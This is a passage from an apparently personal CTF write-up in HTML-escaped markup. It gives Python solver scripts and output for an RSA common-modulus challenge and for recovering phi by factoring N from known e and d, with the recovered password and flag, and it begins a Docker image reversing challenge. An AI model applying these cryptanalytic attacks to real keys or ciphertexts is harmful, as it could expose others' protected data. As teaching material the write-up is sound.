&lt;&#x2F;span&gt;&lt;span&gt;       mx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;N)
&lt;&#x2F;span&gt;&lt;span&gt;       my &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;b)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;N)
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;mx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;my &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;N
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;print_value&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;m)
&lt;&#x2F;span&gt;&lt;span&gt;       &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;password: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;m))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;RSAModuli&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    N &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;109912000665029852639110613517648329286456723008641339857280704469596849864902904497433699518400583047127310193951815657600773158070846253214404943365973285212833463085396438213201198699119774809946581077944790242766448113154577763539028406891886330959853165465205722422606657099078700917856140467421167666409
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    e1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8483335375054406977170922622504583186337530016838437863282901026110032873283
&lt;&#x2F;span&gt;&lt;span&gt;    c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;36218335015829965116681857862094923911529670604844967899611205377832760775576260326404103773026455274015383498872180067299326123507394567136495776656445721750008053407884406429721981213028123626917002902133344001001211001153129276054910760656332569712713895293665052824134204563668126899459472515260162748678
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    e2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1696092050134307306926141131399489465348028792933115624119794329313181584569
&lt;&#x2F;span&gt;&lt;span&gt;    c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;94573796694066531827336525466059061961386054753413091261062046296320713225203050227297438106686083614973232091111723401726835099681471993365822074034482977617851105101070185949797837862416460448964419708443214952302196757178552098691993586224947072414712511340978383044414218196216980045151588556976520156351
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extended_euclidean&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e2)
&lt;&#x2F;span&gt;&lt;span&gt;    c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;modular_inverse&lt;&#x2F;span&gt;&lt;span&gt;(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;N)
&lt;&#x2F;span&gt;&lt;span&gt;    c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;print_value&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I found the password as &lt;code&gt;d0nt_reUs3_c0mm0n_m0duLus_iN_RSA&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We are done with the first part of the challenge to solve the second part..&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; solve_challenge d0nt_reUs3_c0mm0n_m0duLus_iN_RSA
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;**********&lt;&#x2F;span&gt;&lt;span&gt; What the Phi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?  **********
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Give&lt;&#x2F;span&gt;&lt;span&gt; me phi and I&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ll give you a flag
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;N = 66066217976516971108331646970610979560181811216809026125374761401858626331392870627229620955983691200317085064577482992998109175639414254550344337027939622032942798889975535536500814391606941216261629656776109514048858091999991043910655394546974123840192922578050723036392957820297149086606568090771652618243
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;e = 20911404459149607080658877037893189424319551114362027603024719781837162747157
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;d = 32917938316361268851470019425123434593213351924151169940566051302446183421108067642636220773665398581581750049220982066160562413581944447113654550659609920491577412625130031315991437456861571031336990406560139987319989696833394896272093289655434473735396587020547428232094106902009380465366775232334689581885
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;------------------------------\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;|           COMMANDS              |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;|                                 |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;|   1) try_again                  |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;|   2) phi &amp;lt;phi_value&amp;gt;            |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;|   3) exit                       |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;\------------------------------&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we have to find the phi value to get the flag.&lt;&#x2F;p&gt;
&lt;p&gt;For this second part i struggled a lot and i wrote this script on my own and i dont know how it was successfully generated those two valid primes and the phi, haha.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;math
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32917938316361268851470019425123434593213351924151169940566051302446183421108067642636220773665398581581750049220982066160562413581944447113654550659609920491577412625130031315991437456861571031336990406560139987319989696833394896272093289655434473735396587020547428232094106902009380465366775232334689581885
&lt;&#x2F;span&gt;&lt;span&gt;e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20911404459149607080658877037893189424319551114362027603024719781837162747157
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;66066217976516971108331646970610979560181811216809026125374761401858626331392870627229620955983691200317085064577482992998109175639414254550344337027939622032942798889975535536500814391606941216261629656776109514048858091999991043910655394546974123840192922578050723036392957820297149086606568090771652618243
&lt;&#x2F;span&gt;&lt;span&gt;k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;e)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;k
&lt;&#x2F;span&gt;&lt;span&gt;g &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000000&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;		x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(g&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		g &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;y
&lt;&#x2F;span&gt;&lt;span&gt;	q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;y
&lt;&#x2F;span&gt;&lt;span&gt;	p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;	q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;phi = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;q)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The output is&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;phi =  6606621797651697110833164697061097956018181121680902612537476140185862633139287062722962095598369120031708506457748299299810917563941425455034433702793960573434125683360519280660171596715437809832319695445903799227924638336403470759412317164477901296089898605107284333156354738806489492495310099184632281164
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;But the hardest truth is that we can do the second part in just 5 lines of code &lt;code&gt;-_-&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;PublicKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;RSA
&lt;&#x2F;span&gt;&lt;span&gt;rsa &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;RSA&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;construct&lt;&#x2F;span&gt;&lt;span&gt;((N&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;d))
&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rsa&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;p
&lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rsa&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;q
&lt;&#x2F;span&gt;&lt;span&gt;phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Anyways, when i submitted the phi value to the program it printed the flag. Woooooooh!&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;6606621797651697110833164697061097956018181121680902612537476140185862633139287062722962095598369120031708506457748299299810917563941425455034433702793960573434125683360519280660171596715437809832319695445903799227924638336403470759412317164477901296089898605107284333156354738806489492495310099184632281164
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;What?!&lt;&#x2F;span&gt;&lt;span&gt; How did you do that&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;??
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flag{aR3nT_U_tH3_RSA_ninJA&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : flag{aR3nT_U_tH3_RSA_ninJA}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Thank you Phi in Too Much Common.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;docker-leakage&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#docker-leakage&quot; aria-label=&quot;Anchor link for: docker-leakage&quot;&gt;Docker Leakage&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;csaw22&#x2F;dockeREleakage.png&quot; alt=&quot;DockeRElekage&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Docker Leakage is a reversing challenge, the challenge provides a dockeREleakage.zip file which consist of docker image details.&lt;&#x2F;p&gt;
&lt;p&gt;Lets do some reversing on the dockeRElekage folder.&lt;&#x2F;p&gt;
&lt;p&gt;I found some intresting data in the &lt;code&gt;acbb216b17482071caca135101282177f6ffed7b8ee0bfc5323aae103c216d74.json&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;{&amp;quot;architecture&amp;quot;:&amp;quot;amd64&amp;quot;,&amp;quot;config&amp;quot;:{&amp;quot;Hostname&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;Domainname&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;User&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;AttachStdin&amp;quot;:false,&amp;quot;AttachStdout&amp;quot;:false,&amp;quot;AttachStderr&amp;quot;:false,&amp;quot;Tty&amp;quot;:false,&amp;quot;OpenStdin&amp;quot;:false,&amp;quot;StdinOnce&amp;quot;:false,&amp;quot;Env&amp;quot;:[&amp;quot;PATH=&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&amp;quot;],&amp;quot;Cmd&amp;quot;:[&amp;quot;&#x2F;bin&#x2F;sh&amp;quot;],&amp;quot;Image&amp;quot;:&amp;quot;sha256:3b6dbca4ef6990ef88e9d4f28fae8ca57308e779dcb94dc9c4a8fee02e1322c0&amp;quot;,&amp;quot;Volumes&amp;quot;:null,&amp;quot;WorkingDir&amp;quot;:&amp;quot;&#x2F;chal&amp;quot;,&amp;quot;Entrypoint&amp;quot;:null,&amp;quot;OnBuild&amp;quot;:null,&amp;quot;Labels&amp;quot;:null},&amp;quot;container&amp;quot;:&amp;quot;1e4786117e284daaf67335704abef1dac17eaff92d5714a9683ce735c48004c8&amp;quot;,&amp;quot;container_config&amp;quot;:{&amp;quot;Hostname&amp;quot;:&